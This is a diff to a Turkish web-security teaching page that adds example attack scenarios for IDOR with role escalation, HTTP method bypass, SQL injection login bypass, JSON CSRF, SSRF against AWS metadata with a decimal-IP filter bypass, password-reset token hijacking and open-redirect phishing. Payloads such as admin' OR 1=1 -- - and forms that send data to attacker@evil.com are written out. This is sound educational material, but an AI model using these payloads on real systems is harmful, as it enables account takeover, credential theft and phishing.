@@ -745,7 +745,7 @@ forum: {
                         <input type="password" id="password-input" placeholder="Parolanız" required style="width:100%; margin-bottom:10px; padding:10px; border-radius:8px; border:1px solid var(--glass); background:var(--bg); color:white;">
                         <div class="tool-buttons">
                             <button type="submit" id="login-email-btn">Giriş Yap</button>
-                            <button type="button" id="register-email-btn" **disabled**>Kaydol</button>
+                            <button type="button" id="register-email-btn" disabled>Kaydol</button>
                             <p class="small-info" style="font-size: 0.8em; color: #aaa; margin-top: 5px;">*Kayıtlar şimdilik kapalıdır.</p>
                         </div>
                     </form>
@@ -858,7 +858,23 @@ idor: {
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">3- JavaScript Dosyaları: Kaynak kodda <code>fetch("/user/details?user_id=" + uid)</code> gibi dinamik istekler arayın.</li>
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">4- Gizli Parametreler (Parameter Mining): <code>/user/details</code> (kendi bilginizi gösterir) isteğine <code>?user_id=123</code> ekleyerek başka bir kullanıcının bilgisini göstermeyi deneyin.</li>
             </ul>`
-        }
+        },
+{
+    title: "Yetki Yükseltmeli IDOR (Örnek Senaryo)",
+    content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <strong>Senaryo:</strong> Normal bir kullanıcı, API isteğini değiştirerek başka bir kullanıcının rolünü Admin yapabilir (Mass Assignment ile zincirleme IDOR).
+            <pre>
+// Orijinal İstek (User A)
+POST /api/v1/user/update/A123
+{ "username": "A_new" }
+
+// IDOR PoC (User A, Admin B'yi hedefliyor)
+POST /api/v1/user/update/B456
+{ "username": "B_new", "role": "admin" }</pre>
+        </li>
+    </ul>`
+}
     ]
 },
 
@@ -933,6 +949,21 @@ idor: {
           </ul>
         `
       },
+{
+    title: "Metot Manipülasyonu (Örnek Senaryo)",
+    content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <strong>Senaryo:</strong> Kritik bir silme işlemi sadece POST ile yapılmaya izin verirken, DELETE metodunu kontrol etmiyor.
+            <pre>
+// Başarısız İstek (Yetki Hatası)
+GET /admin/delete?user=1 (403 Forbidden)
+
+// Başarılı PoC (Metot Atlatma)
+DELETE /admin/delete?user=1</pre>
+            <div class="small">Sunucu tarafı yetki kontrolü (auth/role check) eksikse, metod değişikliği ile kısıtlama atlanır.</div>
+        </li>
+    </ul>`
+}
           ]
         },
         sqli: {
@@ -1005,7 +1036,25 @@ idor: {
                   <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Rapor: Hangi parametre, tam HTTP isteği ve PoC payload'ı net yaz; hangi DB tipine göre test edildiğini belirt.</li>
                 </ul>
               `
-            }
+            },
+{
+    title: 'SQLi Login Bypass (Örnek Senaryo)',
+    content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                <strong>Senaryo:</strong> Login formunda SQL Injection ile şifre kontrolünü atlama.
+                <pre>
+// Normal Sorgu (Hedeflenen)
+SELECT * FROM users WHERE username = '[username]' AND password = '[password]'
+
+// PoC (Admin Girişi için)
+Username: admin' OR 1=1 -- -
+Password: anything</pre>
+                <div class="small"><code>-- -</code> kısmı SQL'in geri kalanını yorum satırı yapar, sorgu her zaman 'true' döner.</div>
+            </li>
+        </ul>
+    `
+}
           ]
         },
 
@@ -1083,7 +1132,25 @@ idor: {
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Rapor: Hangi endpointler state-changing, hangi parametreler etkili, test sırasında kullanılan tarayıcı ve oturum bilgilerini açıkça yaz.</li>
           </ul>
         `
-      }
+      },
+{
+    title: 'JSON CSRF (Örnek Senaryo)',
+    content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                <strong>Senaryo:</strong> API endpoint'i kritik bir işlemi (örn: e-posta değiştirme) CSRF token'ı olmadan JSON payload ile kabul ediyor.
+                <pre>
+// Kötü Amaçlı HTML (text/plain ve JSON)
+&lt;form action="https://target.com/api/change-email" method="POST" enctype="text/plain"&gt;
+  &lt;input name='{"new_email": "attacker@evil.com", "csrf": "' value='x"}'&gt;
+  &lt;input type="submit" value="Tıkla"&gt;
+&lt;/form&gt;
+</pre>
+                <div class="small">Tarayıcı, <code>text/plain</code> ile isteği gönderir ve sunucu bu payload'u JSON olarak ayrıştırmayı denerse başarılı olabilir.</div>
+            </li>
+        </ul>
+    `
+}
     ]
   },
 
@@ -1133,16 +1200,16 @@ idor: {
           </ul>
         `
       },
-      {
-        title: 'Metadata & Internal Access',
-        content: `
-          <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Cloud metadata hedefle: AWS: <code>http://169.254.169.254/latest/meta-data/</code> → IAM role/credentials çekilebilir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Local services: 127.0.0.1: (admin panel), redis:6379, etcd:2379, kube-apiserver:6443 — GET/POST ile tetikleme denenebilir.</li>
-            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">PoC metadata: <code>?server=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
-          </ul>
-        `
-      },
+{
+    title: 'Metadata & Internal Access',
+    content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Cloud metadata hedefle: AWS: <code>http://169.254.169.254/latest/meta-data/</code> → IAM role/credentials çekilebilir.</li>
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Local services: 127.0.0.1: (admin panel), redis:6379, etcd:2379, kube-apiserver:6443 — GET/POST ile tetikleme denenebilir.</li>
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>AWS Metadata Erişim PoC (Bypass):</strong> Filtreler <code>169.254.169.254</code> IP'sini engelliyorsa, onluk (decimal) gösterimini deneyin:
+            <pre>?url=http://2852039166/latest/meta-data/</pre>
+        </li>
+    </ul>`
+},
       {
         title: 'Kısa Bypass Teknikleri',
         content: `
@@ -1176,6 +1243,7 @@ idor: {
           </ul>
         `
       },
+
     ]
   },
 
@@ -1334,7 +1402,7 @@ file_inclusion: {
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Flag örnekleri (challenge tarzı): curl ile POST istekleri veya null-byte traversal denemeleri kullanılabilir (lab-provided örneklerdeki gibi).</li>
           </ul>
         `
-      },
+      }
     ]
   },
 
@@ -1386,6 +1454,28 @@ file_inclusion: {
           </ul>
         `
       },
+{
+    title: 'Şifre Sıfırlama Tokenı Sömürüsü (Logic Flaw)',
+    content: `
+        <ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                <strong>Senaryo:</strong> Şifre sıfırlama isteği gönderilirken, sunucu sıfırlama token'ını hedef kullanıcının e-postasına gönderir, ancak isteğin gövdesindeki (POST body) bir e-posta parametresini kullanır.
+                <pre>
+// Adım 1: Mağdurun (victim) e-postasını sıfırlama isteğine girilir.
+POST /api/reset_password 
+Body: { "email": "victim@target.com" }
+
+// Adım 2: Sunucu tokeni gönderirken Body'deki e-posta yerine 
+// URL parametresindeki (veya başka bir parametre) e-postayı kullanır.
+
+// PoC: Saldırgan, hem mağdurun hem de kendi e-postasını gönderir.
+POST /api/reset_password?email=attacker@evil.com
+Body: { "email": "victim@target.com" }</pre>
+                <div class="small">Sunucu, token'ı <code>Body</code>'den alıp <code>victim@target.com</code> için oluşturur ancak token'ı göndereceği adresi <code>Query Parameter</code>'dan (<code>attacker@evil.com</code>) alır. Token, saldırgana ulaşır ve hesap ele geçirilir.</div>
+            </li>
+        </ul>
+    `
+}
     ]
   },
 
@@ -1478,13 +1568,20 @@ openredirect: {
                 <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Data/Javascript URI:</strong> <code>javascript:alert(document.domain)</code> veya <code>data:text/html;base64,...</code> deneyerek XSS'e çevirmeye çalışın.</li>
             </ul>`
         },
-        {
-            title: 'PoC Örnekleri',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Temel Atlatma:</strong> <code>/login?next=https://hedef.com.evil.com</code></li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Zorlama:</strong> <code>/logout?target=/%5cevil.com</code> (Ters slash encoding denemesi)</li>
-            </ul>`
-        }
+{
+    title: 'PoC Örnekleri (Yönlendirme Senaryoları)',
+    content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <strong>Phishing Senaryosu (Subdomain Trick):</strong> Güvenilir site adını içeren kötü amaçlı bir URL.
+            <pre>https://hedefsite.com/login?next=https://hedefsite.com.kötüamaclisite.com/giris</pre>
+        </li>
+        <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+            <strong>Protokol/Kodlama Bypass:</strong> Filtrelemeyi atlatmak için çift eğik çizgi veya ters slash kodlaması kullanma.
+            <pre>https://hedefsite.com/continue?url=//kötüamaclisite.com</pre>
+            <pre>https://hedefsite.com/goto?path=/%5cevil.com</pre>
+        </li>
+    </ul>`
+}
     ]
 },
 
